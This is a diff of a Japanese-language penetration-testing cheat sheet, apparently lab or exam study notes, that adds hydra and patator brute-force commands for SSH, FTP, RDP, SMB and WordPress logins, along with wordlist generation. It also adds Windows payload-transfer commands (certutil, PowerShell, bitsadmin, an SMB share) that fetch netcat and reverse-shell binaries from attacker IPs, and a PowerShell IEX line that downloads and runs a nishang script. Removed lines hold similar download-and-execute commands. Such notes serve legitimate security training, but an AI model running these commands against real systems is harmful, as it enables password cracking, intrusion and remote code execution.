@@ -104,7 +104,7 @@ john --show hash.txt
 ```
 
 ### SMTP(25)
-未完了
+[]
 
 ## DNS(53)
 - -NS(ネームサーバーレコード)...ドメインのDNSレコードをホストする権威サーバーの名前が含まれる
@@ -423,7 +423,7 @@ pip install .
 対象サーバにツールを送り込む際に使用。  
 主にnetcatもpowershellも使えないようなときに使う。  
 ```
-python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp <共有するディレクトリ>
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp
 ```
 ```
 C:\WINDOWS\system32>\\<smbserverを立ち上げたIPアドレス>\temp\whoami.exe
@@ -507,7 +507,7 @@ grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <passw
 ```
 
 ## Redis(6379)
-未完了
+[]
 
 # Exploitation
 ## Reverse Shell
@@ -636,21 +636,6 @@ nc <攻撃者のIPアドレス> 9999 < filename
 nc -l -p 9999 > filename
 ```
 
-・コマンドプロンプト
-```
-C:\Users\offsec> certutil -urlcache -split -f "http://10.11.0.4/wget.exe" wget.exe
-```
-・PowerShell
-```
-#ダウンロード
-C:\Users\offsec> powershell -c (New-Object Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe', 'wget.exe')
-C:\Users\offsec> powershell -c Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
-C:\Users\offsec> powershell -c wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
-
-#ダウンロード&実行
-powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/ipw.ps1')"
-```
-
 ## searchsploit
 Exploit-dbを即座に検索できるツール。
 ```
@@ -693,23 +678,88 @@ john --wordlist=/usr/share/wordlist/rockyou.txt --format=Raw-MD5 hash.txt
 ```
 
 ## hydra
-・http login
+- -l...単一のユーザー名の指定
+- -L...ユーザーリストファイルの指定
+- -p...単一のパスワードの指定
+- -P...パスワードファイルの指定
+- -s...カスタムポート(sshが22番以外のポートで使用されている時など)
+- -f...ログインとパスワードの組み合わせが少なくとも1つ見つかったら終了
+- -V...各試行のログインとパスワードを表示
+
+### HTTP Post Form
 ```
+hydra -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 http-post-form "<Login Page>:<Request Body>:<Error Message>"
+
+例)
 hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid Password!"
 ```
 
-・ssh
-未完了
+### FTP
+```
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 ftp
+```
 
-・ftp
-未完了
+### SSH
+```
+hydra -f -l <user> -P /usr/share/wordlists/rockyou.txt 10.10.10.1 -t 4 ssh
+```
+
+### MySQL
+```
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 mysql
+```
+
+### SMB
+```
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 smb
+```
+
+### Wordpress
+```
+hydra -f -l user -P /usr/share/wordlists/rockyou.txt 10.10.10.1 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+```
+### Windows RDP
+```
+hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.1
+```
 
 ## patator
-未完了
+さまざまなプロトコルに対応したパスワードクラックツール。  
+Hydraが成功しない時に、対応するプロトコルモジュールを指定して実行。  
+下記はsshの例。
+```
+patator ssh_login host=10.0.0.1 user=root password=FILE0 0=passwords.txt -x ignore:mesg='Authentication failed.'
+```
 
 ## Wordlist
-未完了
+```
+/usr/share/wordlists/rockyou.txt
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/usr/share/seclists
+```
 
+## Wordlistの作成
+### CeWL
+指定されたURLを指定された深さまでスパイダーして単語リストを作成するツール。
+```
+cewl https://test.com/ -w dict.txt
+```
+- -w...ファイルに出力
+- -d...ディレクトリの深さの指定
+
+### crunch
+自動で全ての組み合わせを出力するツール。  
+下記の例では、最小2文字から最大3文字のワードリストを作成する。
+```
+crunch 2 3 -o dict.txt
+```
+
+### Cupp
+対話形式で個人をプロファイリングすることで、ワードリストを作成する。  
+誕生日、ニックネーム、ペットの名前などを対話形式で答えていく。
+```
+cupp -i
+```
 
 ## aircrack-ng
 ```
@@ -728,6 +778,18 @@ aircrack-ng <filename>.cap
 
 # Privilege Escalation
 ## Linux
+### チェック項目
+- tty shellの獲得
+- linpeas.shの実行(列挙)
+- カーネルバージョンの確認(uname -a)
+- sudoコマンドの権限確認(sudo -l)
+- cronジョブの確認(crontab,systemd timer)
+- 開いているポートの確認(netstat -tulpn)
+- 実行中のプロセスの確認(ps -aux,pspy)
+- SUIDが有効になっているバイナリの列挙
+- パスワードがWebアプリケーションのスクリプトにハードコーディングされていないか確認
+
+
 ### tty shell
 ```
 python -c 'import pty;pty.spbaawn("/bin/sh")'
@@ -777,6 +839,25 @@ uname -a
 sudo -l
 ```
 
+### cronジョブの確認
+#### crontab
+```
+cat /etc/crontab
+```
+#### systemd timersの確認
+/etc/systemd/system/配下にファイルを配置
+- .service(定期実行するファイルのパスなどを記述)
+- .timer(時間間隔の指定)
+```
+systemctl list-timers --all
+```
+
+##### (備考)systemd timerの有効化と起動
+```
+sudo systemctl start datetest.service
+sudo systemctl start datetest.timer
+```
+
 ### Linuxで開いているすべてのポートを表示する方法
 ```
 netstat -tulpn
@@ -788,7 +869,7 @@ netstat -an(linux以外)
 ps -aux
 ```
 
-### pspy
+#### pspy
 実行しているプロセスをダンプ。  
 https://github.com/DominicBreuker/pspy
 
@@ -880,14 +961,62 @@ gcc cowroot.c -o cowroot -pthread
 ```
 
 ## Windows
+### チェック項目
+[]
+
+### ファイルのダウンロード
+#### curl
+```
+curl http://10.10.10.1:9000/putty.exe -o putty.exe
+```
+
+#### certutil.exe
+```
+certutil.exe -urlcache -split -f "http://10.10.14.11:9000/rs.exe" rs.exe
+```
+
+#### powershell.exe
+##### ダウンロード
+```
+powershell.exe -c (New-Object System.Net.WebClient).DownloadFile('http://10.10.14.11:9000/rs.exe', 'rs.exe')
+
+powershell -c (Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe")
+
+powershell -c (wget "http://10.10.14.17/nc.exe" -outfile "c:\temp\nc.exe")
+
+powershell.exe -c (Start-BitsTransfer -Source "http://10.10.14.17/nc.exe -Destination C:\temp\nc.exe")
+```
+##### ダウンロード&実行
+```
+powershell "IEX(New-Object Net.webclient).downloadString('http://10.10.14.16:9001/nishang.ps1')"
+```
+
+#### Bitsadmin
+```
+bitsadmin /transfer job /download /priority high http://10.10.14.17/nc.exe c:\temp\nc.exe
+```
+
+#### SMBを用いたファイル共有
+```
+攻撃側(送信側):
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp
+```
+
+```
+被害者(受信側):
+net view \\10.10.14.11
+dir \\10.10.10.1\temp
+copy \\10.10.10.1\temp\rs.exe rs.exe
+```
+
 ### metasploit(local_exploit_suggester)
-expploitをせずに脆弱性をチェックするために使用するモジュール。
+exploitをせずに脆弱性をチェックするために使用するモジュール。
 meterpreterでシェルを取得している場合、これを使うことで特権昇格に使えるexploitを簡単に探すことができる。
 
 ```
 use post/multi/recon/local_exploit_suggester
 ```
-## windows
+
 ### windows-exploit-suggester
 windowsでexploitを列挙するためのスクリプト
 systeminfoコマンドの出力が必要
@@ -895,13 +1024,12 @@ systeminfoコマンドの出力が必要
 ./windows-exploit-suggester.py --update
 pip install xlrd
 ```
-
 ```
 systeminfo > systeminfo.txt
 ./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
 ```
 
-### evlilwinrm
+### evlilwinrm(5985)
 WinRM(Windowsリモート管理)を利用したペンテスト特化ツール。  
 5985ポートが空いている時に使用。
 
